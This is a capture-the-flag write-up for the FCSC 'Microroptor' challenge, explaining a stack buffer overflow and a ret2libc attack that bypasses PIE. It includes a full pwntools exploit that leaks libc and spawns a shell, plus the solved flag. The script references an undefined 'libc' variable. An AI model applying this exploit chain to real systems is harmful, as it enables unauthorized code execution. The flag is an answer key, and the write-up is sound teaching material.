# Microroptor

> On vous demande d'exploiter le binaire fourni pour lire le fichier flag qui se trouve sur le serveur distant.
>
> nc challenges.france-cybersecurity-challenge.fr 2052

## Analysis

Let's first reverse the code with Ghidra.

By going into the `entry` function, we can see the first argument of the `__libc_start_main`: this is our main function.

The `main` function is quite small:

```c
undefined8 main(void)
{
  int iVar1;
  char local_28 [32];
  
  printf("%p\n",&PTR_s_m3t4ll1cA_00104010);
  read(0,local_28,0x200);
  iVar1 = strncmp(local_28,PTR_s_m3t4ll1cA_00104010,9);
  if (iVar1 == 0) {
    puts("Welcome back master (of puppets)!");
  }
  else {
    puts("Nope, you are no master.");
  }
  return 0;
}
```

There is a leaked address (which will help us overcome PIE), then `read` reads 0x200 characters from the user but place it only in a 32 bytes buffer, so we have a buffer overflow.

This is a textbook ret2libc with PIE.

## Ret2Libc

In this section I present what the ret2libc attack is.

Here the vulnerability to exploit is a buffer overflow.
The vulnerable buffer is located on the stack, thus we can overwrite it until we change the saved `rip` which defines the next instruction to execute.

Because the stack is not executable, we need to use some executable code. Executable code comes from two sources:
- the executed program ;
- the library linked by the program.

We already know what instructions are available in the executed program as we get the binary.
However, the binary is protected with PIE, which randomizes the base address of the program.
Thanksfully, the code leaks the address of the `PTR_s_m3t4ll1cA_00104010`, thus we can overcome PIE.

The next goal is to determine some addresses of functions in the library. Thanks to their offset, we will be able to determine which library is used.

We can then launch the program again, leak the address of one library function to determine its base address (to overcome ASLR), and call `system('/bin/sh')`.

## Determining the offset

To determine the offset, I just open `gdb`, fill the buffer with some characters and look at the saved rip after entering the characters. This gives me the offset.

## Leaking library functions addresses

In the program, the `puts` function is used to display messages. I can use that to display the address of functions from the library by calling `puts(addr_of_function)`.

In order to call a function, I need:
1) to set its arguments;
2) set the address of the function to call.

For the first step, I need to put the arguments value into the correct registers.

![calling convention](https://i.stack.imgur.com/eaSf7.jpg)

Therefore I need to put the address of functions into the `rdi` register.

To do that, I'm using the `pop rdi; ret` gadget, which pops from the stack the value.

The address of the library functions are stored in the PLT part of the program, which I know.

The code to do that (and return to the main function) is the `get_addr` function.

## Final exploit

Once I know the addresses of a couple functions like `puts` and `printf`, I can get the library used and the offsets to `system` and `/bin/sh` using [this website](https://libc.blukat.me/).

This enables me to call `system('/bin/sh')` with the same technique as above.

```python
#!/usr/bin/env python3
from pwn import *

## Launching the program (remote, local or with GDB)
elf = ELF("./microroptor")
rop = ROP(elf)

context.binary = elf
addr = "challenges.france-cybersecurity-challenge.fr"
port = 2052

def conn():
    if args.LOCAL:
        if args.GDB:
            r = process(["gdb", elf.path])
            r.recvuntil(b"gef\xe2\x9e\xa4")
            r.sendline("b system")
            r.recvuntil(b"gef\xe2\x9e\xa4")
            r.sendline("r")
        else:
            r = process([elf.path])
    else:
        r = remote(addr, port)

    return r

# OFFSET needed to overflow the buffer until the saved rip
OFFSET = b"1"*40

# address of MAIN
MAIN = 0x1178

def get_addr(sh, pie_offset, func_name):
    PUTS_PLT = elf.plt['puts'] + pie_offset
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] + pie_offset
    FUNC_GOT = elf.got[func_name] + pie_offset
    print(func_name + " GOT @ " + hex(FUNC_GOT))
    
    payload = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN+pie_offset)
    sh.sendline(payload)
    sh.recvline()

    recv = sh.recvline().strip()
    leak = u64(recv.ljust(8, "\x00".encode()))
    print("Leaked libc address,  "+func_name+": "+ hex(leak))
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        print("libc base @ %s" % hex(libc.address))
    
    return leak

def launch_shell(sh, printf_addr, pie_offset):
    PUTS_PLT = printf_addr + 0x1f900
    SYSTEM = printf_addr - 0xdea0
    BINSH = printf_addr + 0x133462
    POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] + pie_offset
    
    payload = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
    sh.sendline(payload)

def main():
    r = conn()
    r.recvuntil(b"0x")
    leaked_pointer = 0x4010
    real_leaked = r.recvline().strip().decode()
    pie_offset = int(real_leaked, 16) - leaked_pointer
    
    printf_addr = get_addr(r, pie_offset, "printf")
    r.recvuntil(b"0x")
    r.recvline()
    launch_shell(r, printf_addr, pie_offset)

    r.interactive()


if __name__ == "__main__":
    main()
```

Flag: `FCSC{e3752da07f2c9e3a0f9ad69679792e5a8d53ba717a2652e29fb975fcf36f9258}`